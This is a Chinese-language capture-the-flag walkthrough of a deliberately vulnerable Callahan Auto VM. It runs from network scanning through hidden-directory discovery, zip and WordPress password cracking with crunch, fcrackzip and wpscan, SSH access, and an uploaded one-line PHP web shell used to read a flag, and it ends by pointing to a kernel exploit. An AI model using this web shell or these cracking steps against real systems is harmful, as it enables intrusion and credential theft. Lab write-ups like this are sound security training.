# mynew
User Agent Switcher
crunch 
信息收集加强

web页面 :
flag1robots.txt -》目录-》图片=》隐写
flag2  网页源码-》目录=》博客=》 页面信息 txt目录=》flag2

nikto -》登录后台页面 -》博客页面信息=》目录=》图片=》隐写md5=》目录=》页面信息=》ftp
=》目录=》zip+提示=》隐藏html提示=》生成密码破解flag3zip发现txt一部分密码=》提升在博客有你一部分密码
=》暴力破解后台密码=》sshhome页面flag4
flag5：在后端apache站底下发现uploda：-》 后台getwebshell
结合5个flag解开LOOT.zip


#
VMware双击打开，默认nat模式即可！找到六个flag！

1、nmap 192.168.253.0/24 -sP
MAC Address: 00:50:56:E1:B2:64 (VMware)
Nmap scan report for localhost (192.168.253.190)


2、nmap 192.168.253.190 -p- -A

22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 4 disallowed entries 
| /6packsofb...soda /lukeiamyourfather 
|_/lookalivelowbridge /flag-numero-uno.txt

8008/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))


3、web信息收集

1）flag1：
前面nmap枚举出robots.txt：
http://192.168.253.190/robots.txt

------
Disallow: /6packsofb...soda
Disallow: /lukeiamyourfather
Disallow: /lookalivelowbridge
Disallow: /flag-numero-uno.txt

------
http://192.168.253.190/flag-numero-uno.txt
获得flag1：Flag data: B34rcl4ws

----------------------------------
----------------------------------
2）flag2：
访问：http://192.168.253.190/
查看静态源码发现：
https://www.youtube.com/watch?v=VUxOd4CszJ8

浏览视频发现房屋牌子上存在信息：flag2
prehistoricforest

访问：http://192.168.253.190/prehistoricforest

点击：July 6, 2016->Announcing the Callahan internal company blog!
Flag #2: thisisthesecondflagyayyou.txt

访问：
http://192.168.253.190/prehistoricforest/thisisthesecondflagyayyou.txt
Flag2 data: Z4l1nsky

----------------------------------
----------------------------------
3）flag3
用nikto扫描发现：
http://192.168.253.190/prehistoricforest/wp-links-opml.php
WordPress/4.5.26

登录页面：
http://192.168.253.190/prehistoricforest/wp-login.php

在博客中：SON OF A!
http://192.168.253.190/prehistoricforest/index.php/2016/07/07/son-of-a/
发现目录：/richard

访问：http://192.168.253.190/richard
发现存在一张图，下载：
wget http://192.168.253.190/richard/shockedrichard.jpg

枚举：
exiftool shockedrichard.jpg
User Comment : ce154b5a8e59c89732bc25d6a2e6b90b
adfc7551120fa16884c295b6d397931f

查看这是什么加密：
hash-identifier
[+] MD5

解密：
https://www.somd5.com/
spanky

访问：http://192.168.253.190/prehistoricforest/
此内容受密码保护，要查看它，请在下面输入您的密码：
spanky

FTP信息枚举：
告诉我们15分钟开启FTP服务，15分钟后又关闭，依次循环往复，密码：nickburns

nmap 192.168.253.190 -p-
65534/tcp open  unknown

ftp 192.168.253.190 65534
nickburns
-rw-rw-r--   1 nickburns nickburns      977 Jul 15  2016 readme.txt
get readme.txt

查看发现提示：
-------------
1. 服务器上有一个名为NickIzL33t的子文件夹，Nick个人使用的
2. Nick创建了一个加密的zip文件来存储Big的Tom凭据
3. Nick创建了一个提示，提示输入密码以提取加密的zip文件
-------------
访问：
http://192.168.253.190:8008/NickIzL33t
提示：提到只能Steve Jobs访问

打开火狐浏览器挂代理下载插件：
User Agent Switcher

选择iPhone / Safari 12.1.1
然后访问：http://192.168.253.190:8008/NickIzL33t
提示：Gotta know the EXACT name of the .html to break into this fortress.
提示：意思存在隐藏html！


暴力破解文件：
dirb /root/Desktop/rockyou.txt http://192.168.253.190:8008/NickIzL33t  -X .html


存在隐藏html：
http://192.168.253.190:8008/NickIzL33t/fallon1.html

三个提示：
-----------
    A hint - you'll need it
    The third flag - you're not hopeless after all
    Big Tom's encrypted pw backups - because that big tub of dumb can never remember them 
-----------

第一个提示：提示用了很简单的密码信息，以及妻子的昵称：bev（小写），13位数的密码
---
* 一个大写字符   ---A-Z
* 两个数字       ---0-9  0-9
* 两个小写字符   ---a-z a-z
* 一个符号     ---symbol  
* 汤米男孩上映的那一年  ---1955
---

第二个提示：Flag data: TinyHead
第三个提示：下载zip包


暴力破解zip：

首先要制作密码文本：
bev[A-Z][0-9][0-9][a-z][a-z][symbol]1955

```
crunch 13 13 -t bev,%%@@^1995 -o pass.txt
生成58000800字典组合！！
```

参考学习：
https://null-byte.wonderhowto.com/how-to/hack-like-pro-crack-passwords-part-4-creating-custom-wordlist-with-crunch-0156817/

fcrackzip -v -D -u -p pass.txt t0msp4ssw0rdz.zip
2分钟左右~~~
PASSWORD FOUND!!!!: pw == bevH00tr$1995

解压文件：
unzip t0msp4ssw0rdz.zip
bevH00tr$1995
inflating: passwords.txt

获得一个txt文本信息！发现了三个用户名和密码：
---------
Username: bigtommysenior
Password: fatguyinalittlecoat

Note: after the "fatguyinalittlecoat" part there are some numbers, but I don't remember what they are.
However, I wrote myself a draft on the company blog with that information.
-------
在fatguyinalittlecoat后面还有一些数字信息，但是不太记得了，但是在公司博客上用信息给自己写了一份草稿中有记录！！这估计是告诉要登录wordpress站后台进行查看！！


wordpress后台暴力破解：

wpscan --url http://192.168.253.190/prehistoricforest/ -eu
发现用户名：
tommy
richard
tom
michelle


项目三十二讲解过wpscan爆破：注意要关闭us-agent插件
wpscan -U tom -P /root/Desktop/rockyou.txt --max-threads 50 --url http://192.168.253.190/prehistoricforest/
[SUCCESS] - tom / tomtom1                         
Trying tom / skittles2 Time: 00:02:54 <
3分钟爆破出了密码！！


http://192.168.253.190/prehistoricforest/wp-login.php
tom
tomtom1

登录后在：My "ess ess eight" password
发现：1938!!

用户和密码：
bigtommysenior
fatguyinalittlecoat1938!!


----------------------------------
----------------------------------
flag4：
内网信息收集

ssh bigtommysenior@192.168.253.190
fatguyinalittlecoat1938!!

发现flag4：在home目录下发现
Flag data: EditButton


python -m SimpleHTTPServer 8081
chmod +x linpeas.sh

1）Linux version 4.4.0-31-generic
2）127.0.0.1:3306   ---不允许该用户登录
_USER', 'wordpressuser');
define('DB_PASSWORD', 'CaptainLimpWrist!!!');
define('DB_HOST', 'localhost');

3）tommy  （sudo）
Possible private SSH keys were found!
/home/bigtommysenior/.config/lxc/client.key



在前面登录密码后枚举到的信息中说：
可以使用Big Tom的主目录中的备份文件Callahanbak.bak恢复Callahan Auto的网站！

在根目录底下：ls -la
-rwxr-x---   1 www-data www-data   520 Jul  7  2016 .5.txt
www-data是.5.txt的所有者，需要拿到www-data的shell可以读取！


----------------------------------
----------------------------------
flag5：
在后端apache站底下发现uploda：
http://192.168.253.190:8008/NickIzL33t/P4TCH_4D4MS/
文件上传！
php-reverse上传后：
Sorry, only JPG, JPEG, PNG & GIF files are allowed, douchenozzle! Sorry, your file was not uploaded. Want me to save your game of Minesweeper though? 

不允许上传php文件！！

cd upload
nano dayu.php
<?php system($_GET['cmd']); ?>

http://192.168.253.190:8008/NickIzL33t//P4TCH_4D4MS/uploads/dayu.php?cmd=whoami

http://192.168.253.190:8008/NickIzL33t//P4TCH_4D4MS/uploads/dayu.php?cmd=cat%20/.5.txt

------------------------------
FIFTH FLAG!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! YOU DID IT!!!!!!!!!!!!!!!!!!!!!!!!!!!! OH RICHARD DON'T RUN AWAY FROM YOUR FEELINGS!!!!!!!! Flag data: Buttcrack Ok, so NOW what you do is take the flag data from each flag and blob it into one big chunk. So for example, if flag 1 data was "hi" and flag 2 data was "there" and flag 3 data was "you" you would create this blob: hithereyou Do this for ALL the flags sequentially, and this password will open the loot.zip in Big Tom's folder and you can call the box PWNED. 
------------------------------发现flag5：Buttcrack
提示：说到将flag1~5全部合并就能提取loot.zip


----------------------------------
----------------------------------
flag6：
flag1：B34rcl4ws
flag2：Z4l1nsky
flag3：TinyHead
flag4：EditButton
flag5：Buttcrack
B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack

unzip LOOT.zip
inflating: THE-END.txt

YOU CAME.
YOU SAW.
YOU PWNED.

Thanks to you, Tommy and the crew at Callahan Auto will make 5.3 cajillion dollars this year.

GREAT WORK!

I'd love to know that you finished this VM, and/or get your suggestions on how to make the next 
one better.

Please shoot me a note at 7ms @ 7ms.us with subject line "Here comes the meat wagon!"

Or, get in touch with me other ways:

* Twitter: @7MinSec
* IRC (Freenode): #vulnhub (username is braimee)

Lastly, please don't forget to check out www.7ms.us and subscribe to the podcast at
bit.ly/7minsec

</shamelessplugs>

Thanks and have a blessed week!

-Brian Johnson
7 Minute Security


----------------------------------
----------------------------------
提权：
Linux version 4.4.0-31-generic
可以用45010


























































